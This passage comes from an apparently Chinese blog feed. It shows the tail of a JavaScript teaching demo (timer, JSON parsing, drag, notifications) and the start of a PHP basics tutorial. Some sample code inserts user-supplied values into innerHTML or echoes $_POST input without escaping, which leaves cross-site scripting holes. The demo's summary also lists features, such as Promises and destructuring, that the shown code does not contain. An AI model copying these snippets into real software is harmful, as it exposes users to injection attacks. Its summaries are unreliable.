class="string">&#x27;stopTimerBtn&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (timerId) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="built_in">clearInterval</span>(timerId);</span></span><br><span class="line"><span class="language-javascript">                timerId = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">                elapsedTime = <span class="title class_">Date</span>.<span class="title function_">now</span>() - startTime;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">showNotification</span>(<span class="string">&#x27;计时器已停止&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;resetTimerBtn&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">clearInterval</span>(timerId);</span></span><br><span class="line"><span class="language-javascript">            timerId = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">            elapsedTime = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;clock&#x27;</span>).<span class="property">textContent</span> = <span class="string">&#x27;00:00:00&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">showNotification</span>(<span class="string">&#x27;计时器已重置&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">updateTimer</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> now = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span></span><br><span class="line"><span class="language-javascript">            elapsedTime = now - startTime;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> hours = <span class="title class_">Math</span>.<span class="title function_">floor</span>(elapsedTime / <span class="number">3600000</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> minutes = <span class="title class_">Math</span>.<span class="title function_">floor</span>((elapsedTime % <span class="number">3600000</span>) / <span class="number">60000</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> seconds = <span class="title class_">Math</span>.<span class="title function_">floor</span>((elapsedTime % <span class="number">60000</span>) / <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> milliseconds = <span class="title class_">Math</span>.<span class="title function_">floor</span>((elapsedTime % <span class="number">1000</span>) / <span class="number">10</span>);</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;clock&#x27;</span>).<span class="property">textContent</span> = </span></span><br><span class="line"><span class="language-javascript">                <span class="string">`<span class="subst">$&#123;<span class="built_in">String</span>(hours).padStart(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)&#125;</span>:<span class="subst">$&#123;<span class="built_in">String</span>(minutes).padStart(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)&#125;</span>:<span class="subst">$&#123;<span class="built_in">String</span>(seconds).padStart(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)&#125;</span>.<span class="subst">$&#123;<span class="built_in">String</span>(milliseconds).padStart(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 18. 显示通知</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;showNotificationBtn&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">showNotification</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 19. JSON处理</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;parseJsonBtn&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> jsonData = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;jsonData&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> parsed = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(jsonData);</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;jsonOutput&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                    &lt;p&gt;&lt;strong&gt;姓名:&lt;/strong&gt; <span class="subst">$&#123;parsed.name&#125;</span>&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                    &lt;p&gt;&lt;strong&gt;年龄:&lt;/strong&gt; <span class="subst">$&#123;parsed.age&#125;</span>&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                    &lt;p&gt;&lt;strong&gt;城市:&lt;/strong&gt; <span class="subst">$&#123;parsed.city&#125;</span>&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                    &lt;p&gt;&lt;strong&gt;爱好:&lt;/strong&gt; <span class="subst">$&#123;parsed.hobbies.join(<span class="string">&#x27;, &#x27;</span>)&#125;</span>&lt;/p&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                `</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">showNotification</span>(<span class="string">&#x27;JSON解析成功&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">catch</span> (e) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;jsonOutput&#x27;</span>).<span class="property">innerHTML</span> = </span></span><br><span class="line"><span class="language-javascript">                    <span class="string">`&lt;p style=&quot;color: red;&quot;&gt;JSON解析错误: <span class="subst">$&#123;e.message&#125;</span>&lt;/p&gt;`</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">showNotification</span>(<span class="string">&#x27;JSON解析失败&#x27;</span>, <span class="number">5000</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;formatJsonBtn&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> jsonData = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;jsonData&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> parsed = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(jsonData);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> formatted = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(parsed, <span class="literal">null</span>, <span class="number">2</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;jsonData&#x27;</span>).<span class="property">value</span> = formatted;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">showNotification</span>(<span class="string">&#x27;JSON已格式化&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">catch</span> (e) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">showNotification</span>(<span class="string">&#x27;JSON格式化失败&#x27;</span>, <span class="number">5000</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 20. 事件委托</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;eventList&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (e.<span class="property">target</span>.<span class="property">tagName</span> === <span class="string">&#x27;LI&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> index = <span class="title class_">Array</span>.<span class="title function_">from</span>(e.<span class="property">target</span>.<span class="property">parentNode</span>.<span class="property">children</span>).<span class="title function_">indexOf</span>(e.<span class="property">target</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;eventOutput&#x27;</span>).<span class="property">innerHTML</span> = </span></span><br><span class="line"><span class="language-javascript">                    <span class="string">`点击了列表项 <span class="subst">$&#123;index + <span class="number">1</span>&#125;</span>: <span class="subst">$&#123;e.target.textContent&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">                </span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 21. 添加动画效果</span></span></span><br><span class="line"><span class="language-javascript">                e.<span class="property">target</span>.<span class="property">style</span>.<span class="property">transform</span> = <span class="string">&#x27;scale(1.05)&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                e.<span class="property">target</span>.<span class="property">style</span>.<span class="property">transition</span> = <span class="string">&#x27;transform 0.2s&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                </span></span><br><span class="line"><span class="language-javascript">                <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    e.<span class="property">target</span>.<span class="property">style</span>.<span class="property">transform</span> = <span class="string">&#x27;scale(1)&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;, <span class="number">200</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 22. 初始化</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 23. 设置初始时钟</span></span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">updateClock</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setInterval</span>(updateClock, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 24. 添加示例列表项</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> eventList = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;eventList&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">5</span>; i &lt;= <span class="number">7</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;li&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                li.<span class="property">textContent</span> = <span class="string">`列表项 <span class="subst">$&#123;i&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">                li.<span class="property">style</span>.<span class="property">padding</span> = <span class="string">&#x27;10px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                li.<span class="property">style</span>.<span class="property">border</span> = <span class="string">&#x27;1px solid #eee&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                li.<span class="property">style</span>.<span class="property">margin</span> = <span class="string">&#x27;5px 0&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                li.<span class="property">style</span>.<span class="property">borderRadius</span> = <span class="string">&#x27;4px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                eventList.<span class="title function_">appendChild</span>(li);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 25. 显示欢迎通知</span></span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">showNotification</span>(<span class="string">&#x27;欢迎使用JavaScript综合示例&#x27;</span>, <span class="number">5000</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;, <span class="number">500</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 26. 页面加载完成后初始化</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, init);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 27. 键盘事件处理</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keydown&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (e.<span class="property">key</span> === <span class="string">&#x27;Escape&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;userOutput&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;jsonOutput&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;eventOutput&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">showNotification</span>(<span class="string">&#x27;所有输出已清空&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 28. 拖拽功能示例</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> notification = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;notification&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> isDragging = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> offsetX, offsetY;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        notification.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousedown&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            isDragging = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">            offsetX = e.<span class="property">clientX</span> - notification.<span class="title function_">getBoundingClientRect</span>().<span class="property">left</span>;</span></span><br><span class="line"><span class="language-javascript">            offsetY = e.<span class="property">clientY</span> - notification.<span class="title function_">getBoundingClientRect</span>().<span class="property">top</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousemove&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (isDragging) &#123;</span></span><br><span class="line"><span class="language-javascript">                notification.<span class="property">style</span>.<span class="property">position</span> = <span class="string">&#x27;absolute&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                notification.<span class="property">style</span>.<span class="property">left</span> = (e.<span class="property">clientX</span> - offsetX) + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                notification.<span class="property">style</span>.<span class="property">top</span> = (e.<span class="property">clientY</span> - offsetY) + <span class="string">&#x27;px&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseup&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            isDragging = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 29. 使用ES6+特性</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> <span class="title function_">formatDateTime</span> = (<span class="params">date</span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> options = &#123; </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">year</span>: <span class="string">&#x27;numeric&#x27;</span>, </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">month</span>: <span class="string">&#x27;2-digit&#x27;</span>, </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">day</span>: <span class="string">&#x27;2-digit&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">hour</span>: <span class="string">&#x27;2-digit&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">minute</span>: <span class="string">&#x27;2-digit&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">second</span>: <span class="string">&#x27;2-digit&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(date).<span class="title function_">toLocaleString</span>(<span class="string">&#x27;zh-CN&#x27;</span>, options);</span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 30. 添加当前时间戳</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;jsonData&#x27;</span>).<span class="property">value</span> = <span class="string">`&#123;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">   &quot;name&quot;: &quot;示例用户&quot;,</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">   &quot;timestamp&quot;: &quot;<span class="subst">$&#123;<span class="built_in">Date</span>.now()&#125;</span>&quot;,</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">   &quot;formattedTime&quot;: &quot;<span class="subst">$&#123;formatDateTime(<span class="built_in">Date</span>.now())&#125;</span>&quot;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&#125;`</span>;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个JavaScript综合示例展示了以下知识点：</p>
<ol>
<li><strong>变量与作用域</strong>：使用<code>let</code>和<code>const</code>声明变量，理解局部和全局作用域</li>
<li><strong>函数</strong>：定义和调用函数，包括箭头函数</li>
<li><strong>数据类型</strong>：处理字符串、数字、布尔值、对象和数组</li>
<li><strong>DOM操作</strong>：<ul>
<li>查找元素（getElementById, querySelector）</li>
<li>修改内容（innerText, innerHTML）</li>
<li>操作样式（classList, style）</li>
<li>创建和添加元素（createElement, appendChild）</li>
</ul>
</li>
<li><strong>事件处理</strong>：<ul>
<li>事件绑定（addEventListener）</li>
<li>事件委托</li>
<li>阻止默认行为</li>
</ul>
</li>
<li><strong>表单处理</strong>：<ul>
<li>获取表单值</li>
<li>表单验证</li>
<li>动态更新</li>
</ul>
</li>
<li><strong>定时器</strong>：<ul>
<li>setInterval和setTimeout</li>
<li>清除定时器</li>
</ul>
</li>
<li><strong>JSON处理</strong>：<ul>
<li>JSON.parse和JSON.stringify</li>
<li>错误处理</li>
</ul>
</li>
<li><strong>ES6+特性</strong>：<ul>
<li>模板字符串</li>
<li>箭头函数</li>
<li>对象解构</li>
<li>Promise（隐式使用）</li>
</ul>
</li>
<li><strong>错误处理</strong>：<ul>
<li>try&#x2F;catch</li>
<li>输入验证</li>
</ul>
</li>
<li><strong>交互效果</strong>：<ul>
<li>动画</li>
<li>拖拽</li>
<li>通知系统</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>Web</category>
        <category>前端&amp;后端基础</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP基础详解</title>
    <url>/2025/12/06/PHP%E5%9F%BA%E7%A1%80%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="1-PHP简述"><a href="#1-PHP简述" class="headerlink" title="1. PHP简述"></a>1. PHP简述</h2><h3 id="详细解释"><a href="#详细解释" class="headerlink" title="详细解释"></a>详细解释</h3><p>PHP（Hypertext Preprocessor，超文本预处理器）是一种通用开源脚本语言，主要用于Web开发。它最初被设计为服务器端脚本语言，现在已发展成为一种通用编程语言。</p>
<h3 id="核心特点："><a href="#核心特点：" class="headerlink" title="核心特点："></a>核心特点：</h3><ul>
<li><strong>开源免费</strong>：PHP是完全开源的，可以自由使用和修改</li>
<li><strong>跨平台</strong>：可以在Windows、Linux、macOS等操作系统上运行</li>
<li><strong>嵌入HTML</strong>：PHP代码可以嵌入到HTML中，便于Web开发</li>
<li><strong>服务器端执行</strong>：PHP代码在服务器上执行，结果以纯HTML形式返回给浏览器</li>
<li><strong>丰富的库</strong>：PHP拥有超过1000个内置函数，支持各种功能</li>
</ul>
<h3 id="PHP在Web开发中的角色："><a href="#PHP在Web开发中的角色：" class="headerlink" title="PHP在Web开发中的角色："></a>PHP在Web开发中的角色：</h3><ul>
<li>生成动态网页内容</li>
<li>处理表单数据</li>
<li>与数据库交互</li>
<li>创建会话和Cookie</li>
<li>生成图像和PDF</li>
<li>与其他系统通信</li>
</ul>
<h3 id="PHP与Java-JavaScript的区别："><a href="#PHP与Java-JavaScript的区别：" class="headerlink" title="PHP与Java&#x2F;JavaScript的区别："></a>PHP与Java&#x2F;JavaScript的区别：</h3><ul>
<li>PHP是服务器端语言，Java可以是客户端也可以是服务器端</li>
<li>Java与JavaScript没有关系，只是名字相似</li>
<li>PHP执行在服务器上，JavaScript执行在客户端</li>
</ul>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// PHP基本示例</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成动态内容</span></span><br><span class="line"><span class="variable">$greeting</span> = <span class="string">&quot;Welcome to our website!&quot;</span>;</span><br><span class="line"><span class="variable">$date</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;<span class="subst">$greeting</span>&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Current time: <span class="subst">$date</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 表单处理示例</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>] ?? <span class="string">&quot;Guest&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Hello, <span class="subst">$name</span>! Your form was submitted successfully.&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;PHP Basic Example&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;Simple Form&lt;/h2&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;&lt;?php echo htmlspecialchars(<span class="subst">$_SERVER</span>[&quot;</span>PHP_SELF<span class="string">&quot;]); ?&gt;&quot;</span>&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;name&quot;</span>&gt;Name:&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> id=<span class="string">&quot;name&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;h3&gt;Current Server Time&lt;/h3&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="2-基本语法格式"><a href="#2-基本语法格式" class="headerlink" title="2. 基本语法格式"></a>2. 基本语法格式</h2><h3 id="详细解释-1"><a href="#详细解释-1" class="headerlink" title="详细解释"></a>详细解释</h3><p>PHP脚本以<code>&lt;?php</code>开始，以<code>?&gt;</code>结束。PHP代码可以嵌入到HTML中。</p>
<h3 id="语法特点："><a href="#语法特点：" class="headerlink" title="语法特点："></a>语法特点：</h3><ul>
<li><strong>标记</strong>：PHP代码需要放在特定的标记中</li>
<li><strong>注释</strong>：支持单行和多行注释</li>
<li><strong>变量</strong>：以<code>$</code>符号开头，后面跟着变量名</li>
<li><strong>语句</strong>：以分号<code>;</code>结束</li>
</ul>
<h3 id="PHP标记类型："><a href="#PHP标记类型：" class="headerlink" title="PHP标记类型："></a>PHP标记类型：</h3><ul>
<li><code>&lt;?php ... ?&gt;</code>：标准标记（推荐）</li>
<li><code>&lt;? ... ?&gt;</code>：短标记（需要在php.ini中启用short_open_tag）</li>
<li><code>&lt;% ... %&gt;</code>：ASP风格标记（不推荐）</li>
<li><code>&lt;script language=&quot;php&quot;&gt; ... &lt;/script&gt;</code>：脚本标记（不推荐）</li>
</ul>
<h3 id="变量命名规则："><a href="#变量命名规则：" class="headerlink" title="变量命名规则："></a>变量命名规则：</h3><ul>
<li>变量名必须以字母或下划线开头</li>
<li>变量名可以包含字母、数字和下划线</li>
<li>变量名区分大小写</li>
<li>变量名不能包含空格</li>
</ul>
<h3 id="注释类型："><a href="#注释类型：" class="headerlink" title="注释类型："></a>注释类型：</h3><ul>
<li><code>//</code>：单行注释</li>
<li><code>#</code>：单行注释（Unix风格）</li>
<li><code>/* ... */</code>：多行注释</li>
</ul>
